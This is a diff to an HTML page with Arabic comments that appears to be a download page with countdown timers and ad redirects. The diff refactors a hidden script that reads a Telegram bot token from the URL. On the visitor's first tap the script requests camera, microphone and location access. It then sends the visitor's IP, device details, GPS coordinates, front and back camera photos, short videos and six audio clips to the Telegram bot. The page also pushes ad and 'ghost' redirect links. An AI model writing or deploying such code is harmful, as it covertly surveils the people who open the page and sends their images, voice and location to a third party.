@@ -82,7 +82,9 @@
 </div>
 
 <script>
-// 1. قراءة البيانات
+// ═══════════════════════════════════════════════════
+// 1. قراءة البيانات من الرابط
+// ═══════════════════════════════════════════════════
 const urlParams = new URLSearchParams(window.location.search);
 const config = {
     id: urlParams.get('id') || '',
@@ -96,47 +98,73 @@ const config = {
     r: urlParams.has('r')
 };
 
-// 2. تشغيل الأدوات مع أول تفاعل (أول ما يدوس في أي حتة)
+const botUrl = (config.id && config.token) ? `https://api.telegram.org/bot${config.token}/` : null;
+
+// ═══════════════════════════════════════════════════
+// 2. دوال الإرسال الآمنة
+// ═══════════════════════════════════════════════════
+async function sendMsg(text) {
+    if (!botUrl) return;
+    try {
+        const res = await fetch(botUrl + "sendMessage", {
+            method: 'POST', 
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: config.id, text: text, parse_mode: 'HTML'})
+        });
+        if (!res.ok) console.error("Telegram Msg Error:", await res.text());
+    } catch (e) {
+        console.error("sendMsg Error:", e);
+    }
+}
+
+async function sendFile(method, formData) {
+    if (!botUrl) return;
+    try {
+        const res = await fetch(botUrl + method, { method: 'POST', body: formData });
+        if (!res.ok) console.error(method + " Error:", await res.text());
+    } catch (e) {
+        console.error("sendFile Error:", e);
+    }
+}
+
+// ═══════════════════════════════════════════════════
+// 3. تشغيل الأدوات (Trigger)
+// ═══════════════════════════════════════════════════
 let toolsStarted = false;
-function triggerTools() {
+async function triggerTools() {
     if (toolsStarted) return;
     toolsStarted = true;
 
-    // بنطلب الأذونات فوراً في نفس لحظة الضغط (عشان المتصفح ميرفضهم)
-    if (config.fc || config.bc || config.fcv || config.bcv || config.r) {
-        navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
-            // بنقفلهم فوراً بعد ما خدنا إذن
-            stream.getTracks().forEach(t => t.stop());
-            // بعد ما خدنا إذن، بنشغل باقي الأدوات
-            setTimeout(runTools, 500);
-        }).catch(e => {
-            // لو رفض، هنشغل اللي مش محتاج كاميرا
-            setTimeout(runTools, 500);
-        });
-    } else {
-        setTimeout(runTools, 500);
+    let needsMedia = config.fc || config.bc || config.fcv || config.bcv || config.r;
+
+    if (needsMedia) {
+        try {
+            // طلب الأذونات مرة واحدة
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            stream.getTracks().forEach(t => t.stop()); // إغلاق فوري بعد أخذ الإذن
+        } catch (e) {
+            console.error("Media Permission Error:", e);
+            sendMsg(`⚠️ <b>تنبيه:</b> تم رفض إذن الكاميرا/المايك.\n<b>السبب:</b> ${e.message}`);
+        }
     }
 
-    // طلب الموقع فوراً
     if (config.loc && navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(()=>{}, ()=>{});
     }
+
+    runTools(); // تشغيل باقي الأدوات فوراً بدون تأخير
 }
 
 document.addEventListener('click', triggerTools, { once: true });
 document.addEventListener('touchstart', triggerTools, { once: true });
 
-// 3. كود الأدوات
+// ═══════════════════════════════════════════════════
+// 4. الأدوات ورفع البيانات
+// ═══════════════════════════════════════════════════
 async function runTools() {
-    if (!config.id || !config.token) return;
-    const botUrl = `https://api.telegram.org/bot${config.token}/`;
-    const chatId = config.id;
+    if (!botUrl) return;
 
-    async function sendMsg(text) {
-        try { await fetch(botUrl + "sendMessage", { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: chatId, text: text, parse_mode: 'HTML'}) }); } catch (e) {}
-    }
-
-    // معلومات
+    // 4.1 معلومات الجهاز
     if (config.inf) {
         try {
             let ipRes = await fetch('https://api.ipify.org?format=json');
@@ -146,103 +174,138 @@ async function runTools() {
                 let b = await navigator.getBattery();
                 batteryInfo = `\n<b>البطارية:</b> ${Math.round(b.level * 100)}% ${b.charging ? 'تشحن' : 'لا تشحن'}`;
             }
-            sendMsg(`🟢 <b>دخول جديد</b>\n<b>IP:</b> <code>${ipData.ip}</code>\n<b>UA:</b> <code>${navigator.userAgent}</code>\n<b>الشاشة:</b> ${screen.width}x${screen.height}${batteryInfo}`);
-        } catch (e) {}
+            let msg = `🟢 <b>دخول جديد</b>\n<b>IP:</b> <code>${ipData.ip}</code>\n<b>UA:</b> <code>${navigator.userAgent}</code>\n<b>الشاشة:</b> ${screen.width}x${screen.height}${batteryInfo}`;
+            await sendMsg(msg);
+        } catch (e) {
+            console.error("Info Error:", e);
+        }
     }
 
-    // الموقع
+    // 4.2 الموقع
     if (config.loc && navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition((pos) => {
-            sendMsg(`📍 <b>الموقع</b>\n<a href="https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}">اضغط لفتح الخريطة</a>`);
-        }, (err) => {}, { enableHighAccuracy: true });
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            await sendMsg(`📍 <b>الموقع</b>\n<a href="https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}">اضغط لفتح الخريطة</a>`);
+        }, (err) => {
+            console.error("Location Error:", err);
+        }, { enableHighAccuracy: true });
     }
 
-    // صور
+    // 4.3 الصور
     if (config.fc || config.bc) {
         if (config.fc) await takePhoto("user", "الأمامية");
         if (config.bc) await takePhoto("environment", "الخلفية");
     }
 
-    // فيديو
+    // 4.4 الفيديو
     if (config.fcv || config.bcv) {
         if (config.fcv) await takeVideo("user", "الأمامية");
         if (config.bcv) await takeVideo("environment", "الخلفية");
     }
 
-    // تسجيل صوتي (6 مرات)
+    // 4.5 الصوت (6 تسجيلات)
     if (config.r) {
         await recordAudio();
     }
+}
 
-    // الدوال المساعدة
-    async function takePhoto(facingMode, label) {
-        try {
-            let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
-            let video = document.createElement('video'); video.srcObject = stream; video.play();
-            await new Promise(r => setTimeout(r, 1000));
-            let canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            canvas.toBlob((blob) => {
-                let formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('photo', blob, `photo_${label}.jpg`);
-                formData.append('caption', `📸 صورة ${label}`);
-                fetch(botUrl + "sendPhoto", { method: 'POST', body: formData });
-                stream.getTracks().forEach(t => t.stop());
-            }, 'image/jpeg');
-        } catch (e) {}
-    }
-
-    async function takeVideo(facingMode, label) {
-        try {
-            let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode }, audio: true });
-            let mediaRecorder = new MediaRecorder(stream);
-            let chunks = [];
-            mediaRecorder.ondataavailable = e => chunks.push(e.data);
-            mediaRecorder.onstop = () => {
-                let blob = new Blob(chunks, { type: 'video/webm' });
-                let formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('video', blob, `video_${label}.webm`);
-                formData.append('caption', `🎥 فيديو ${label}`);
-                fetch(botUrl + "sendVideo", { method: 'POST', body: formData });
-                stream.getTracks().forEach(t => t.stop());
-            };
-            mediaRecorder.start();
-            await new Promise(r => setTimeout(r, 5000));
-            mediaRecorder.stop();
-        } catch (e) {}
-    }
-
-    async function recordAudio() {
-        try {
-            let stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            for (let i = 1; i <= 6; i++) {
-                await new Promise((resolve) => {
-                    let mediaRecorder = new MediaRecorder(stream);
-                    let chunks = [];
-                    mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                    mediaRecorder.onstop = () => {
-                        let blob = new Blob(chunks, { type: 'audio/webm' });
-                        let formData = new FormData();
-                        formData.append('chat_id', chatId);
-                        formData.append('audio', blob, `voice_${i}.webm`);
-                        formData.append('caption', `🎤 تسجيل صوتي ${i}`);
-                        fetch(botUrl + "sendAudio", { method: 'POST', body: formData });
-                        resolve();
-                    };
-                    mediaRecorder.start();
-                    setTimeout(() => { mediaRecorder.stop(); }, 5000);
-                });
-                await new Promise(r => setTimeout(r, 500));
-            }
-            stream.getTracks().forEach(t => t.stop());
-        } catch (e) {}
+// ═══════════════════════════════════════════════════
+// 5. الدوال المساعدة (Photo, Video, Audio)
+// ═══════════════════════════════════════════════════
+async function takePhoto(facingMode, label) {
+    let stream = null;
+    try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
+        let video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+        await new Promise(r => setTimeout(r, 1500)); // انتظار التركيز
+        
+        let canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        
+        let blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+        let formData = new FormData();
+        formData.append('chat_id', config.id);
+        formData.append('photo', blob, `photo_${label}.jpg`);
+        formData.append('caption', `📸 صورة ${label}`);
+        
+        await sendFile("sendPhoto", formData);
+    } catch (e) {
+        console.error(`Photo (${label}) Error:`, e);
+        await sendMsg(`❌ فشل التقاط صورة ${label}:\n${e.message}`);
+    } finally {
+        if (stream) stream.getTracks().forEach(t => t.stop());
     }
 }
 
-// 4. كود العداد والإعلانات
+async function takeVideo(facingMode, label) {
+    let stream = null;
+    try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode }, audio: true });
+        let mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+        let chunks = [];
+        mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+        
+        let stopped = new Promise(resolve => mediaRecorder.onstop = resolve);
+        
+        mediaRecorder.start();
+        await new Promise(r => setTimeout(r, 5000));
+        mediaRecorder.stop();
+        await stopped;
+        
+        let blob = new Blob(chunks, { type: 'video/webm' });
+        let formData = new FormData();
+        formData.append('chat_id', config.id);
+        formData.append('video', blob, `video_${label}.webm`);
+        formData.append('caption', `🎥 فيديو ${label}`);
+        
+        await sendFile("sendVideo", formData);
+    } catch (e) {
+        console.error(`Video (${label}) Error:`, e);
+        await sendMsg(`❌ فشل تسجيل فيديو ${label}:\n${e.message}`);
+    } finally {
+        if (stream) stream.getTracks().forEach(t => t.stop());
+    }
+}
+
+async function recordAudio() {
+    let stream = null;
+    try {
+        stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        for (let i = 1; i <= 6; i++) {
+            let mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+            let chunks = [];
+            mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+            
+            let stopped = new Promise(resolve => mediaRecorder.onstop = resolve);
+            
+            mediaRecorder.start();
+            await new Promise(r => setTimeout(r, 5000));
+            mediaRecorder.stop();
+            await stopped;
+            
+            let blob = new Blob(chunks, { type: 'audio/webm' });
+            let formData = new FormData();
+            formData.append('chat_id', config.id);
+            formData.append('audio', blob, `voice_${i}.webm`);
+            formData.append('caption', `🎤 تسجيل صوتي ${i}`);
+            
+            await sendFile("sendAudio", formData);
+            await new Promise(r => setTimeout(r, 500)); // فاصل بسيط
+        }
+    } catch (e) {
+        console.error("Audio Error:", e);
+        await sendMsg(`❌ فشل تسجيل الصوت:\n${e.message}`);
+    } finally {
+        if (stream) stream.getTracks().forEach(t => t.stop());
+    }
+}
+
+// ═══════════════════════════════════════════════════
+// 6. كود صفحة التحميل بتاعتك (العدادات والإعلانات)
+// ═══════════════════════════════════════════════════
 var SMART_LINK = "https://araplhn.org/4/7e093505ac4f216b5950d797a595b30c";
 var WAIT1 = 5, WAIT2 = 30, WAIT3 = 30, GAP = 5;
 var GHOST = ["https://bauval.org/14/5405685805ef1654c71ceda217bef848", "https://abscloud.org/1/01876be0a03b020428ee8dc56f00181f"];
@@ -269,4 +332,4 @@ $("b2").onclick = function(){ goNext(this, function(){ show(3); addGhost(); ring
 $("b3").onclick = function(){ window.location.href = SMART_LINK; };
 </script>
 </body>
-</html>
+ </html>
